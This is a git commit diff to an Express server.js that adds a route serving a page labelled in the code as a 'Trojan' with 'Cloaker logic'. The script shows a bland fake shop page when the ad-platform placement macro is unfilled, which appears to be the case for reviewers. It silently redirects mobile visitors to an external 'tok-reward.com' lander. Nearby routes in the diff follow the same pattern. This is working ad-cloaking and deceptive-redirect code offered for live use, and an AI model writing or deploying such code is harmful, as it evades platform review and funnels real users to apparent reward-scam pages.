e0cd184094deaed357a938fa059be237288eda26
carsoncraig1 <156372400+carsoncraig1@users.noreply.github.com>
2024-05-21 15:12:55 -0400

    Update server.js

--- server.js
+++ server.js
@@ -338,6 +338,38 @@ app.get('/twbrandy/:slug', (req, res, next) => {
             console.log(`Served brandy Trojan (tyler)(${slug})`);
 });
 
+// Middleware to pass on Tyler's SubIDs Lulu Camp
+app.get('/twlulu/:slug', (req, res, next) => {
+    const { offer, slug } = req.params;
+    const destinationLander = `https://tok-reward.com/twlulu.html?sub=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to ${slug} Shop!</h1>
+            <p>You are shopping at: ${slug}</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served lulu Trojan (tyler)(${slug})`);
+});
 
 // Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
 app.get('/shein/:slug', (req, res, next) => {
